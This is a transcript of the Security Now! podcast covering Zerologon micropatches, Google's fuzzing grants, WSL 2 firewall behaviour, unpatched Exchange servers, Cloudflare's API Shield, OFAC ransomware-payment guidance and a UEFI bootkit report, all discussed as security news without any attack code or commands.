Okay.  His blog provides a truly wonderful look into the micropatch development process, and it is this week's GRC shortcut URL, so https://grc.sc/786.  Or you can also duck it by searching for "0patch Zerologon."  And yes, I did just say "duck it."



LEO:  There you go.  There you go again.



STEVE:  And you can find it.  Anyway, in his blog posting, this blog posting that I'm referring to, grc.sc/786, or just again search "0patch Zerologon," he explains in detail what's going on, what the patch developers faced, and what they created.  And they include the full source code right there in the blog posting for the micropatch, which eliminates this vulnerability.  They essentially duplicated what Microsoft did, that is, they looked at the change that Microsoft made, and they said, okay, we can do that.



The problem is, since the target platform is 2008 R2, meaning that it's 12 years old, the specific function that was patched by Microsoft in the later servers is not present.  So they had to implement the same patch functionality somewhere else in the authentication flow, and they did.  But you're showing on the screen right now, Leo, just a beautiful documented reverse engineering of the problem that Microsoft had, and what they did.  So the perfect vulnerability has exploded onto the scene.  It's simple to do.  It's incredibly powerful and destructive, if it can be used.  It's every ransomware villain's dream come true, and GitHub is filled with sample source code implementations.



LEO:  Boy, these patches are really tiny.  I mean, this is, what, 30 assembly lines.



STEVE:  Yes.  It's 29 bytes of code.



LEO:  Instructions, yeah.  It's nothing.



STEVE:  It's just beautiful.



LEO:  Yeah.  Wow.  It's nice to see the code.  I mean, I'm always nervous when you recommend a patch from a third party and all that.  But if you can see the code, I guess that's okay.



STEVE:  Yeah, these guys have also - at some point reputations really start to count.



LEO:  Yeah.  I mean, they've been doing this for a long time, yeah.



STEVE:  Yup.  And when they're providing a service that nobody else offers, I mean, you've got to say here's a third party patching an egregious problem in a server that Microsoft has chosen for corporate policy and commercial purposes to abandon.



LEO:  Right.  Right.



STEVE:  You know, again, it's difficult for that to be okay.  But that's the world we live in, and we now live in a world where a lot of source code for this nightmare is out and is being quickly weaponized.



LEO:  Got to do something, yeah.  They've got to do something.



STEVE:  And Leo, it is every ransomware villain's dream, this thing, because it's corporations that are going to let, you know, bad guys are going to get in this way, install backdoors, and just have at it.



LEO:  Probably already have.



STEVE:  Yeah.



LEO:  In about two or three months we'll start to see it.  That's Steve Gibson right there.  This guy's doing God's work, as you can see.  Microsoft's work, too, apparently.  GRC.com is where to go to catch the latest version of the show.  He has 16Kb and 64Kb audio versions of it.  He has transcripts.  He's also got SpinRite, the world's best hard drive recovery and maintenance utility available now in 6.0; 6.1 is almost here.  You will be in on the beginnings, the beta tests, and the final release if you buy SpinRite 6 right now.  Don't forget the forums, forums.grc.com/register.  Early entry for people listening to this show.  Get your name now.  And they're looking nice, looking very clean, very sweet.



We also have audio and video of the show at our website, TWiT.tv/sn.  Or you could simply watch it on YouTube or listen to it on your Amazon Echo.  Just ask for the Security Now! podcast.  Or better yet, subscribe in your favorite podcast client, and that way you'll just get it automatically the minute it's available.



We'd better get you out of here.  I think you've got a date in about 40 minutes.



STEVE:  I'm watching the clock, Leo.



LEO:  Me, too, Steve.  That's Steve Gibson.  Thank you, Steve, we'll see you next week on Security Now!.



STEVE:  Thanks, buddy.  Well, you're going to see me in two days.



LEO:  Thursday.  Can't wait.  3:00 p.m. Pacific, 6:00 p.m. Eastern, our very special panel of Last Pass, no, ITProTV.  Yeah.  Thanks, Steve.  See ya.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#787

DATE:		October 6, 2020

TITLE:		Why Win7 Lives On

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-787.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine several new and welcome Google initiatives aimed at improving Android general web browser security.  We look at Microsoft's solution for updating aging Windows offline images with the latest Defender definitions.  We note some surprising network behavior from Windows second Subsystem for Linux.  We check in on Exchange Server updates after eight months.  We cover Cloudflare's announcement of a very welcome Web API firewall, the U.S. Treasury's recent policy regarding ransomware payments, and Kaspersky's discovery of the use of UEFI Bootkits.  Then we have a bit of errata and a GRC forums update.  We conclude by sharing the results of an interesting poll which illuminates the many reasons why Windows 7 refuses to die.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  We have lots to talk about:  why the new Windows Subsystem for Linux, WSL in Windows 10, bypasses the Windows Firewall, and what you can do about it; Microsoft changing some of the ways it's doing updating, in vitro updating for Defender.  We'll talk about Cloudflare's new API protection.  And then why is it some people are still using Windows 7?  Steve takes a look at Ed Bott's poll of users.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 787, recorded Tuesday, October 6, 2020:  Why Windows 7 Lives On.



It's time for Security Now!, the show where we cover your privacy, your security with this guy right here, Mr. Steve Gibson of the Gibson Research Corporation, creator of SpinRite and our leader into the world of the dark side of the Internet.  Hello, Steve.



STEVE GIBSON:  Yo, Leo.  



LEO:  How are you today?



STEVE:  Great to be with you.  Episode 787 for, yeah, October 6th.



LEO:  We're in the airliner series.  



STEVE:  It's happening, baby.



LEO:  Yeah, yeah.



STEVE:  So there was a bunch of interesting news.  Nothing really stuck out except Ed Bott took a poll a couple weeks ago over at ZDNet when they were noticing what a large percentage of their visitors were still coming to their site with Windows 7.  So we thought, what?  Let's ask people why.  And I thought that would just be interesting.  Certainly it has a bearing on security, as we know, because the updates terminated at the beginning of this year.  And almost 10% of ZDNet's current web visitors are still using Windows 7.  So the title of this week's podcast is "Why Win7 Lives On," which I think will be interesting to our listeners.  And I was a little surprised until I thought about it, and I thought, oh, okay, yeah, that makes sense.  So with that tease, we will get to that.



But first we're going to examine several new and welcome Google initiatives aimed at improving Android sort of in general, and also everybody's web browser security.  We're going to look at Microsoft's solution, which is kind of really interesting and cool, for updating aging offline Windows images with the latest Defender definitions.  We're going to look at some surprising network behavior from Windows' second Subsystem for Linux, which is where we are now, WSL 2.  Their re-architecting of it had a side effect that is catching some people off guard.  We're also going to check in on Exchange Server updates eight months downstream of the February patch, and it probably won't surprise any of our listeners to learn that they have not all been updated yet.



We're also going to cover Cloudflare's announcement of a very welcome new free Web API firewall.  Also the U.S. Treasury has decided to update their policies regarding ransomware payments, and no one's happy about that.  Also, and this was probably the most tweeted thing to me over the past week, Kaspersky's discovery of the use of another UEFI Bootkit, which always makes all of our listeners nervous.  We've got a little bit of errata from last week.  I'm going to update our listeners about the GRC forums.  And then we're going to take a look at the interesting results of this poll that ZDNet conducted - I think it was 3,600 respondents, so a nice chunky big sample - and learn why Windows 7 refuses to die.  It's not surprising, but some things were.



LEO:  It's tempting to assume it's kind of stupidity of some kind, or they're just old and don't want to change things.  But I bet, well, I haven't read it yet, so I'm curious.  But I bet it's some better reason than that, I would hope.  We shouldn't judge.



STEVE:  Indeed.  And we do have a programmer's keyboard to show everybody for our Picture of the Week.  



LEO:  It's probably all Escape keys.  I haven't looked at it yet, though.  So we'll see.  Oh, I love it.  This is a good Picture of the Week.  I like it.



STEVE:  I had seen it once before, and it struck me as just fun.  So this is, for those who don't have video, this is showing us the SuperCoder 2000, which it has the subtitle "Air cooled coding keyboard for professional use."  And because this is about programming, it has exactly three buttons:  a "0," a "1," and a "Done."



LEO:  That's all you need.



STEVE:  Because one presumes that the fingers will be flying, it's got very prominent air vents to allow it to air cool because that keyboard would tend to overheat otherwise from all the zeroes and ones being pumped into it.  And we're sort of used to 3D models and rendering these days.  This thing looks real.  I mean, I think it's old.



LEO:  Somebody built this for sure.  Somebody built this for sure.



STEVE:  Yeah, yeah.  So that's like, okay, good.



LEO:  I'm not saying somebody used it.  But they definitely built it.



STEVE:  Yeah.  You can enter a "0" or "1," and then you can declare when you're done.  So basically that sums it up.



So Google is going to be getting even more proactive about Android security.  We know that Google runs their own bug bounty program for Android apps which are those listed in the Play Store, the ones that they're curating.  That program is called the Google Play Security Reward Program, not a very catchy abbreviation, GPSRP, Google Play Security Reward Program.  And through that program independent security researchers are rewarded for locating and responsibly reporting bugs they find in Play Store Android apps.  So Google is in essence paying for bug submissions on behalf of its platform apps' publishers.



But one limitation of the GPSRP is that it's restricted to major apps having more than 100 million users.  So I guess Google is saying, look, guys, there's a lot of apps there, and don't go finding some bug in an obscure app that 12 people have downloaded.  While we would like to have that fixed, we're not that concerned about it.  You're not going to get a bounty for that.  So the GPSRP, 100 million users minimum.  But Google noticed that other apps that handle sensitive data may be performing critical tasks and don't meet that 100 million threshold, which would make them ineligible for GPSRP rewards and are therefore less likely to be tested by external bug hunters.



So what happened was some sharp-eyed person noted a job posting that went online last Wednesday in which Google wrote:  "As a Security Engineering Manager in Android Security, your team will perform application security assessments against highly sensitive, third-party Android apps on Google Play, working to identify vulnerabilities and provide remediation guidance to impacted application developers."



And according to Sebastian Porst, who is the Software Engineering Manager for Google Play Protect, this new team will be focused on apps such as COVID-19 contact tracing and election-related applications, with others to follow.  In their coverage of this event, ZDNet quoted Lukas Stefanko, a mobile malware analyst at security firm ESET.  Lukas said that it was definitely a good move, and also that finding security issues with serious impact isn't that easy and requires a lot of time and experience.  So to Google's credit, having a dedicated team ensures that some of the world's best security talent will put their focus and effort into looking at apps that might otherwise slip under the radar and could end up being exploited with serious consequences.



So anyway, just Google again doing good things for the community.  And we see a lot of that from our view of Google.  I know that it's controversial.  There was some brouhaha recently that erupted in some dialogue over on GRC's forums because I'm using ReCAPTCHA, which of course is Google's CAPTCHA anti-bot solution, and people were objecting to the fact that Google is Google.  But from our perspective here, Google's doing a lot of work to keep things secure.  And in fact they are also going to be funding a JavaScript research engine, or essentially offering grants for people.  They've established a new grant program to fund research aimed at locating bugs in the industry's browsers' JavaScript engines.  The eligible targets are Google's Chrome V8 engine, Firefox's SpiderMonkey, and the Safari JavaScriptCore, each which are the JavaScript processing engines for those browsers.  And they did indicate that other engines could be pitched in a grant proposal, but we'll see in a minute why those three make the most sense.



So this program will help and sponsor security researchers and academics to find vulnerabilities hidden inside any of those three JavaScript engines, and the program only has one rule.  The bugs must be identified through fuzzing.  And we've talked about the virtues and value and power of fuzzing many times in the past.  However, since fuzzing tends to be an extremely resource-intensive process, it's traditionally been the province of larger tech organizations that can afford the resources required to set up comprehensive fuzzing operations.



To be done at scale, it typically employs large and expensive cloud computing, resources that are typically beyond the reach of most solo researchers working on their own in the hope of finding a significant bug.  And of course the cloud resources need to be paid for, whether or not there's any follow-on bug bounty payoff.  And even when bounties are paid, it can be months later, if at all.  So in their blog post last Thursday, Google said it created this research grant to address exactly these problems.  Under Google's new pilot program, which will have a one-year duration, October 1st last Thursday to October 1st of 2021, security researchers and academics can apply for the funds required to fuzz any of those three JavaScript engines.  Google said it will analyze each grant proposal submission and provide an answer to all applicants within two weeks, with approved projects receiving up to $5,000 in funding.



Now, naturally, since Google is a provider of exactly such cloud services themselves, might as well keep the money in the family.  The grant funding will actually be up to $5,000 in credits to be used on Google's Compute Engine, which is their heavy computing infrastructure in the cloud.  So it runs, as I said, from October 1st, 2020 through 2021.  And they're calling the program the Fuzzilli Research Grant, or Fuzzilli - obviously a play on a pasta; right? - F-U-Z-Z-I-L-L-I, named after Google's own Fuzzilli open source fuzzing tool, which supports distributed fuzzing on the Google Compute Engine, and of course Google naturally encourages grant recipients to use.  I guess the $5,000 cloud computing grant credit wouldn't do you any good unless you were going to use it on Google's Compute Engine, which is the only place you can use it.



Although Google said that all bugs identified during the pilot program must be reported to the affected vendors, researchers may retain any bug bounty payoffs themselves for any bugs they might find during the program.  Samuel Gross, the creator of Fuzzilli and a member of Google's Project Zero team, said:  "JavaScript engine security continues to be critical for user safety, as demonstrated by recent in-the-wild zero-day exploits abusing vulnerabilities in Chrome's V8 JavaScript engine."



So I think this is neat.  If, for example, any of our listeners might have some time on their hands during the COVID mess, or just during spare time on evenings and weekends, you could figure out how Fuzzilli works.  It's all posted.  It's open source.  It's there on GitHub.  Play with it on your own machine to work out the details and come up with an idea, then apply to Google for a $5,000 grant to scale its use up to big cloud iron level.  And if you were to get lucky with fuzzing, essentially for free, using Google's cloud infrastructure, you might uncover a previously unknown and valuable flaw.  And then you could score yourself some cash without incurring any other out-of-pocket expenses.



I've got the various links to the announcement and to its presence on GitHub for anyone who's interested.  Samuel's blog posting about this added, he said:  "Submissions are not limited to those in academia or those with a demonstrated track record of success.  If you have a good idea in this space, we'd love to hear from you.  Incoming submissions will be reviewed by a review board on a regular basis, and we aim to respond to every submission within two weeks.  If the project is accepted, the researchers may be awarded GCE (Google's Compute Engine) credits worth up to $5,000.



"Researchers can also apply for multiple grants throughout the lifetime of the project.  The grants come with the following requirements," he wrote.  "The credits must be used for fuzzing JavaScript engines with the approach described in the proposal.  The fuzzed JavaScript engines should be one or more of the following:  JavaScriptCore for Safari, V8 for Chrome and Edge" - and remember any other Chromium-based browsers - "or SpiderMonkey used by Firefox."  And when I went over to take a look at and remind myself about Fuzzilli, because we had talked about it before, I saw that it was those three engines for which there is already prepared interfacing open source glue, essentially.  So using those three would be far easier with Fuzzilli, although you could certainly do something else if you wanted to bite that off and then propose that to Google.



Samuel said:  "All vulnerabilities found must be only reported to the affected vendor."  Meaning responsibly and privately.  "Researchers are encouraged to apply Project Zero's 90-day disclosure policy.  Researchers may claim any CVE credits and bug bounty payouts for reporting the bugs that don't conflict with the following requirements."  He said:  "Any newly developed source code must be published under an open source license that permits further research by others."  So, for example, if you did bring up support for some different browser's JavaScript engine, then that needs to be part of your contribution to the open source community.



He said:  "An interim report for Google only at the conclusion of the fuzzing, to demonstrate the initial results of the research, so that we can determine the efficacy of the research and make our folks in accounting happy."  So justify the $5,000 that got burned somehow.  "Furthermore, a final report of some form - for example, a conference paper, a blog post, or a standalone PDF - due no later than six months after the first grant for a project has been awarded, including a detailed explanation of the project, basic statistics about which engines have been fuzzed for how long (CPU time, iterations, et cetera), and a clear technical explanation of all vulnerabilities discovered throughout the project."



And he concludes:  "Researchers are encouraged to base their project on the open source" - oh, here, we were just talking about this - "the Fuzzilli fuzzer, if possible."  You know, he's the guy who wrote it, so yeah, he'd like to see it used also, which is ready to go on Google's Compute Engine.  So again, a very cool opportunity.  If there are any of our listeners who think this might apply to them, I would suggest you think about it.  Grab Fuzzilli, play with it, figure it out, see if it makes sense, and then go for a grant.  You could end up having a CVE to your name, and maybe a bug bounty payment.



This I thought was really interesting.  And props to Microsoft.  Microsoft is giving Defender what I described as "in vitro updating."  Many enterprise environments used a fixed image of Windows, which they downloaded from Microsoft at some point, to set up their new workstations.  And these images are often used for many months at a time.  We know that enterprise especially wants to hold onto a given install image as long as they can.  The last thing they want to be doing is spreading, "smearing," to use the word I have before, various major feature builds of Windows 10 across their enterprise.  It really behooves them to keep them synced.



So as a consequence, a static image of some instance of Windows 10 would be used for a long time.  And, you know, there's really no point in updating to a newer download of the same image, since it's just going to be the same download.  Microsoft isn't changing those over time.  But that's the problem.  The trouble is that these images are aging, and so is their built-in Windows Defender definitions, which were frozen at the time that that image was created, making Windows Defender, as is built in, less and less relevant because it's aging, too, and it won't know about any of the newer threats that have been discovered and added to the current Defender AV definitions.



And yes, it's true that after the image has been deployed onto a new machine, and that machine has gone online, downloaded everything that has happened in the Windows world since that original image was downloaded and frozen, then those are updated and the system is rebooted, then yes, it, too, will have caught up and had the latest and greatest.  But the problem in Microsoft's words is that that still leaves a potentially significant "protection gap," which is the term they used, during which a machine that's booted up and running and on the network could have some seriously outdated Defender definitions  until it can update itself.



So to close this protection gap, on Friday Microsoft released a new tool for both 32- and 64-bit systems that allows an up-to-the-minute version of Windows Defender to be inserted into an offline WIM or VHD Windows image, thus bringing the image's AV awareness current before it's being used to create any running systems.  I've got their annoying links with a link ID.  I've got them both in the show notes, for anyone who's interested, at the bottom of page 3.  Those links point to ZIP files, each of which contains two files:  an updated and continually updated Windows Defender .CAB file and a PowerShell script which is named "defenderupdatewinimage.ps1."



There's also a link to an upper level announcement, Microsoft Defender Update for Windows Operating System Installation Images in the show notes that would take you to a page explaining how to use those ZIPs and to deploy.  But I think it's very cool.  It allows you to take a standard Windows install and, in vitro, insert the latest Defender into it so that the moment it comes up and boots, even before it's had a chance to update everything else, it is up to the minute updated with Defender things.  And as we know, especially this year, that's become more important than ever because there have been lots of critical things which, I mean, it's what we've been spending a lot of time recently talking about is that people are not applying these updates in as timely a fashion as necessary, and there are threats in the wild that are taking advantage of these.  So again, props to Microsoft for getting ahead of this.



I mentioned at the top a change that had been made in Windows Subsystem for Linux v2.  It turns out that it quietly completely bypasses its hosting machine's Windows 10 Firewall, which is new behavior.  And so I wanted to make sure that none of our listeners would get caught out by this.  The first version of Windows Subsystem for Linux, WSL 1, was implemented using a Linux-emulating pseudo-kernel that translated Linux system calls into their equivalent WinNT kernel calls.  So under WSL 1, any network traffic would actually be coming from Windows, that is, any Linux-sourced network traffic would actually be coming from Windows and is thereby filtered through the standard built-in Windows application firewall.  The Linux distro honors any configured rules because it's behind that firewall because it's also actually behind the Windows kernel.



But with the second release, the second iteration, and it was a huge change, WSL 2 does everything differently.  In WSL 2, Microsoft produced a true Linux kernel operating side by side with Windows in a Hyper-V virtual machine and a Hyper-V virtual network adapter.  As a consequence of this complete re-architecting, it's a completely different architecture.  So unlike with WSL 1, WSL 2 traffic is sent directly to the virtual network adapter, completely bypassing the Windows Firewall.  So this is not in itself a bad thing.  I would argue it's way more powerful, and it's cleaner, and that this architecture is correct.  It means you've got Linux and Windows side by side, rather than this first pass kludge that they created.  But it does mean that an unwary user might mistakenly assume that they had the same merged Windows Firewall protection after updating themselves and their system to WSL 2, and that's not the case.  So they could be inadvertently left exposed.



So anyway, just beware that there is no Windows Firewall protecting WSL 2 instances of Linux.  It is out there on the raw network adapter, and so subject to any incoming that the Windows application firewall before was protecting.  So of course Linux is where the Internet, well, Unix actually, was where the Internet was born.  And so it's got firewalls and filters and network protection galore.  But you need to turn it on, if that's what you're expecting to have.



And speaking of things not being patched for quite some length of time, we talked about this at the time.  On February 11th, 2020, Microsoft released security updates to address a vulnerability in Microsoft Exchange Server that would allow an attacker to turn any stolen Exchange user account into a complete system compromise.  In many implementations, this could be used to completely compromise the entire exchange environment, including all email and potentially Active Directory itself, giving bad guys complete access into a system.  That was February 11th, which was Patch Tuesday in February.  A month later, any admins who were paying attention would have subsequently learned that any still unpatched servers were then being exploited in the wild by unnamed APT (Advanced Persistent Threat) actors.



So what's the story today, eight months from the time that the patch was released?  Somewhat unbelievably, Rapid7 conducted a survey on September 21st and found that out of 433,464 open and Internet-facing Exchange Servers - and of course that's what Exchange Server is supposed to be; right?  It's email.  It's going to be out there on the public Internet.  433,464 could be observed on the Internet.  On September 21st, at least 61% of Exchange 2010, 2013, 2016, and 2019 servers have remained vulnerable to the flaw, despite their having been offered an update.  And this flaw, this vulnerability is not theoretical, like Spectre and Meltdown.  This is known to be exploited in the wild.



You know, we moan and we groan and we feel rightly sorry when large enterprises are struck, for example, by debilitating ransomware, having their information exfiltrated, being publicly shamed, having their users' data put at risk of exposure, and often needing to pay a hefty ransom.  But when you learn that - and this is the count - 267,986 individual Exchange Servers still remain vulnerable to remote exploitation today, eight months after a patch to close this vulnerability has been made available, well, no one deserves to be illegally attacked.  It's still illegal.  But wearing a sign that says "Kick me" is known to be asking for it.  And any enterprise that - and there's 267,000, almost 268,000 individual Exchange Servers, eight months from the patch availability, still exploitable.  It's just crazy.



And although it isn't a simple vulnerability like a problem with RDP, where you can simply get in without authentication, it's clearly and rightfully a privilege escalation or elevation.  You need to have an Exchange account.  But it's a perfect example of the idea of someone getting in, doing some reconnaissance, watching the system that they're on, looking at traffic.  It would not be difficult to do keystroke logging and capture Exchange credentials or monitor a workstation's traffic and get credentials.  As soon as you have any credential on that Exchange Server, then it can be used to potentially get you access to that network's Active Directory.  And as we were just talking about last week, that's the keys to the kingdom, then essentially giving you access to much more on that network, allowing a bad guy then to move laterally and get to all the machines there.



So again, it's like, how can it be?  I mean, these must just be completely administratively abandoned Exchange Servers, or people who aren't paying attention to the fact.  I mean, I guess for our listeners there's just nothing could be more clear today than that with the use of software comes the need to keep it current.  It is an obvious truth that is constantly being reinforced by what we see now every day.



Our friends at Cloudflare just added a free Web API Firewall service for all of their customers. 



LEO:  Oh.



STEVE:  Yeah, it's very cool.  Last Thursday they announced their new API Shield.  I've got a link to the blog posting which announces it in the show notes.  They start out by explaining APIs are the lifeblood of modern Internet-connected applications.  Every millisecond, they carry requests from mobile applications - place this food delivery order, "like" this picture - and directions to IoT devices - unlock the car door, start the wash cycle, my human just finished a 5K run - among countless other calls.



They said:  "They're also the target of widespread attacks designed to perform unauthorized actions or exfiltrate data, as data from Gartner increasingly shows."  Quoting Gartner, they said:  "By 2021, 90% of web-enabled applications will have more surface area for attack in the form of exposed APIs rather than the UI, up from 40% in 2019."  And "Gartner predicted that, by 2022, API abuses will move from an infrequent to the most-frequent attack vector, resulting in data breaches for enterprise applications."  Of the 18 million requests per second that traverse Cloudflare's network, 50% are directed towards APIs, with the majority of these requests blocked as malicious.



So just sort of back up a little bit.  A perfect example of a Web API, just to kind of give our listeners some context, that we've talked about not too long ago, was the SSP API.  That was the SQRL Service Provider API that I designed and created for Rasmus to use when he created the SQRL client for XenForo.  I didn't want to burden him with the need to learn anything about how SQRL works.  And I realized that this would also be a general boon for SQRL's server-side adopters.



So I hid and encapsulated all of SQRL's various details behind a very simple abstract authentication API.  It was accessible through a simple HTTP query and reply.  And in that way Rasmus could simply post HTTP queries using any web agent, in this case PHP, and receive meaningful replies.  And this is the model that's evolving for the entire industry.  It allows for the creation of elegant and clean interfaces.  And in the SQRL use case, I was able to make the interface private, since it only needed to support transactions between Rasmus's PHP code and mine, both which resided on the same server, or also on the same network.  But the case that Cloudflare is addressing requires much more security, since as the Gartner group notes, most of these APIs need to be publicly available.



So like with the web and communications, what we're now beginning to see is, once upon a time, it was a browser being viewed by a human that was pulling content from a web server.  Increasingly, it's, well, I mean, a perfect example I was talking about just recently, when I added IoT gizmos.  I have now an IoT thermostat which is setting the temperature for the room I'm in, and an IoT hygrometer which is measuring temperature and humidity.  Those are definitely communicating, using Web APIs, to their cloud providers in China.  And while I'm happy to have them do that, it is the potential abuse of those which would open an opportunity for them to be exploited on my network, which again is why they are sequestered on a network where, if anything were to get loose, it couldn't damage the rest of my network.



Okay.  So Cloudflare continued their announcement by saying:  "To combat these threats, Cloudflare is making it simple to secure APIs through the use of strong client certificate-based identity" - which is, I'll just say, very cool - "and," they said, "strict schema-based validation.  As of today, these capabilities are available free for all plans within our new API Shield offering.  And as of today, the security benefits also extend to gRPC-based APIs, which use binary formats such as protocol buffers rather than JSON, and have been growing in popularity with our customer base."  So I'll just note that they've implemented a proper "deny all" model that only permits valid formatted API calls to pass.



So they explained:  "A positive security" - which is what they called it.  "A positive security model is one that allows only known behavior and identities, while rejecting everything else.  It's the opposite of the traditional negative security model enforced by a Web Application Firewall that allows everything except for requests coming from problematic IPs, ASNs, countries, or requests with problematic signatures like SQL injection attempts."



They said:  "Implementing a positive security model for APIs is the most direct way to eliminate the noise of credential stuffing attacks and other automated scanning tools.  And the first step towards a positive model is deploying strong authentication such as mutual TLS authentication, which is not vulnerable to reuse or sharing of passwords."  And I'll just note that, for example, once Cloudflare deploys this, once people with Web APIs enable that and able to enable it, then for example Shodan would no longer see any of this.  That would just go dark.  You would not be discoverable or listable by Shodan.  And of course that's what you want.  You don't want to be seen.  And it's not because you've chosen to change your port and you're using an unknown port, which can still be discovered.  It's because you're saying we're going to do mutual TLS authentication and have both ends affirmatively acknowledged.



So they said - this is Cloudflare speaking.  "Just as we simplified the issuance of server certificates back in 2014 with Universal SSL, API Shield reduces the process of issuing client certificates to clicking a few buttons in the Cloudflare Dashboard.  By providing a fully hosted private public key infrastructure (PKI), you can focus on your applications and features rather than operating and securing your own certificate authority."



So in other words, they're making it trivial and free for users of their services to issue their own client certificates, which would then be known to their own CA.  So then you put this certificate in your devices that you want to authenticate to the Web API which Cloudflare is hosting.  When that certificate is presented as part of the TLS handshake, it will be verified.  It'll be tied to your account, to your specific API permissions, and it will have been signed by their CA, so it will be valid.



They said:  "Once developers can be sure that only legitimate clients with SSL certificates in hand are connecting to their APIs, the next step in implementing a positive security model is making sure that those clients are making valid requests.  Extracting a client certificate from a device and reusing elsewhere is difficult, but not impossible.  So it's also important to make sure that the API is being called as intended."



In other words, they recognize that, yes, creating client-based certificates is strong security, but it's possible in theory to extract the certificate.  For example, if it was my residential thermostat making certificate authenticated queries, well, it's sitting, you know, in people's homes.  You can buy one from Amazon.  It's very much like we talked a long time ago about how it's impossible to actually encrypt DVDs that cannot have the decryption keys discovered because the decryption keys have to be in the DVD player that the consumer has.  Which means you can't hide them perfectly.



Anyway, so Cloudflare of course recognizes this.  They say:  "Requests containing extraneous input may not have been anticipated by the API developer and can cause problems if processed directly by the app.  So these should be dropped at the edge, if possible.  API Schema validation works by matching the contents of API requests - the query parameters that come after the URL and contents of the POST body - against a contract or 'schema' that contains the rules for what is expected.  If validation fails, the API call is blocked, protecting the origin from any invalid request or any malicious payload."



They said:  "Schema validation is currently in closed beta for JSON payloads, with gRPC protocol buffer support on the roadmap. If you would like to join the beta, please open a support ticket with the subject 'API Schema Validation Beta.'  After the beta has ended, we plan to make schema validation available as part of the API Shield user interface."  So this is way cool.  Their announcement continues with a demonstration and examples of API schema definitions that explicitly define valid query formats which are used to drive their query-validation firewall.



So once again, Cloudflare is innovating and leading the way with some powerful protections for their customers.  To which I say bravo.  And note, this is exactly the kind of thing that you would like to have in front of your potentially vulnerable API backend.  Fuzzing on the outside would simply be blocked by this firewall because fuzzing is all about throwing unexpected weird stuff at an API.  And when it crashes, you go, "Ooh," and then that gives you a place to look to figure out how and why it crashed and then go from there.  But with something like this, which is checking any inbound arguments against the schema that the developer defined, even if their own API doesn't enforce it, this drops those things, as Cloudflare said, "at the edge."  They go no further.  They are just ignored.  And you don't even look at the bandwidth of all that stuff coming in.  You just don't see it any longer.



So the more I think about what Cloudflare is doing, the more I think I may have them in my own future.  As we know, I'm still maintaining a full-height rack of physical servers and network equipment in a nearby Level 3 datacenter.  And I'm reminded that three years ago, while I was attending a DigiCert Customer Advisory Board meeting in Utah, I happened to mention GRC's rack of equipment.  A bunch of the networking gurus turned toward me as one, and with sort of a look of puzzled brow-furrowing.



LEO:  Yeah, look at the caveman over there.



STEVE:  And one of them said - yeah, exactly.  And actually, I was the oldster in the group.  And one of them said, "What?  No one does hardware anymore."



LEO:  Yeah.



STEVE:  And I said, "Oh, I guess I am old school."  But I took their point.  And at some point in the future, when it no longer makes sense for GRC to have a rack of equipment at Level 3, but before I'm ready to abandon GRC.com - I mean, we're all getting older, Leo - I'll likely move it to the cloud.  And Cloudflare would probably be my first choice for GRC's final home.  And it would just make sense.  So anyway, these guys just keep doing good things and offering very useful services, just a palette of more and more useful services.



LEO:  It's impressive, yeah.



STEVE:  So the U.S. Department of the Treasury has tightened up on ransomware payments.  I'm not sure how I feel about this.  And I understand it, but it's easy for them to do.  Last Thursday the U.S. Treasure Department issued revised guidelines which, among other things, are targeting this new phenomenon of ransomware negotiators, and actually also their insurers.  I've got a link to their sort of snapshot policy, and also I think it was a five-page PDF.



So in a little snapshot they said:  "The U.S. Department of the Treasury's Office of Foreign Assets Control (OFAC)" - which also sounds a little bit like it looks.



LEO:  OFAC, yeah.



STEVE:  Anyway, OFAC.  OFAC.  Anyway, they're issuing an advisory to alert companies that engage with victims of ransomware attacks, right, so they're alerting the companies that engage with victims of ransomware attacks, so that would be the negotiators and the insurers, of the potential sanctions risks for facilitating ransomware payments.



They said:  "This advisory highlights OFAC's designations of malicious cyber actors and those who facilitate ransomware transactions under its cyber-related sanctions program.  It identifies U.S. government resources for reporting ransomware attacks and provides information on the factors OFAC generally considers when determining an appropriate enforcement response to an apparent violation, such as the existence, nature, and adequacy of a sanctions compliance program.  The advisory also encourages financial institutions and other companies that engage with victims of ransomware attacks to report such attacks to and fully cooperate with law enforcement, as these will be considered significant mitigating factors."



So the five-page PDF goes into all the details.  But effectively, the Treasury Department wants to be notified of ransomware attacks because large sums of money are crossing U.S. borders and potentially moving into the hands of sanctioned individuals, teams, or governments.  And the presumption is that - I got a kick out of this - when notified, Treasury will simply say no.  A Treasury official, asked about this specifically, said that:  "License applications involving ransomware payments demanded as a result of malicious cyber-enabled activities will be reviewed by OFAC on a case-by-case basis with a presumption of denial."  In other words, you're supposed to get a licensed application to make such payment, and OFAC will probably say no.



So this really puts victims, their negotiators, and their insurers in an awkward hot seat position, especially when circumstances might strongly compel the victim to want to pay the ransom and to take advantage of various intermediaries and insurers.  So this whole thing is rapidly becoming a hot mess, as people now say these days.



In what was probably the most tweeted event of the week, UEFI Bootkits - you know, I was tempted to say they're becoming more mainstream.  But I don't think they are.  The very first UEFI Bootkit was spotted by ESET just over two years ago.  We covered it here at the time.  Their posting at their site, WeLiveSecurity.com, was titled "LoJax:  First UEFI rootkit found in the wild, courtesy of the Sednit Group."  And if those words and terms sound familiar, it's because, yeah, two years ago we talked about it.



Two years ago ESET's write-up started off by explaining this a little bit.  They said:  "UEFI rootkits are widely viewed as extremely dangerous tools for implementing cyberattacks, as they are hard to detect and able to survive security measures such as operating system reinstallation and even a hard disk replacement.  Some UEFI rootkits have been presented as proofs of concept; some are known to be at the disposal of at least some governmental agencies.  However, no UEFI rootkit has ever been detected in the wild until we [ESET] discovered a campaign by the Sednit APT group that successfully deployed a malicious UEFI module onto a victim's system."



So that was two years ago.  Today, UEFI rootkits are back in the news thanks to some research findings from Kaspersky.  Kaspersky's 30-page PDF is titled "MosaicRegressor:  Lurking in the Shadows of UEFI."  And that 30-page PDF is not a fluff piece.  It drops right into the technology that they found and reverse engineered.  So what we know, thanks to Kaspersky's research, is that a Chinese-speaking hacking group has been observed using a UEFI bootkit to download and install additional malware on targeted computers.



